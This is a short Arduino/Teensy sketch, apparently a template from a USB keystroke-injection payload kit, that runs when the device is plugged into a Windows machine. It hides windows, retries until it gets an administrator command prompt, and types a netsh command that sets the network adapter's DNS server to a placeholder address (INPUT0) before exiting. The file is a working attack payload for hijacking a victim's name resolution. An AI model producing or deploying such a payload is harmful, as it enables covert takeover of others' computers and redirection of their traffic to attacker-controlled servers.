#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println("netsh interface ip set dns \"Local Area Connection\" static INPUT0");
  delay(3000);

  Keyboard.println("exit");
  
  
  }

void loop() {
	
}

DEFS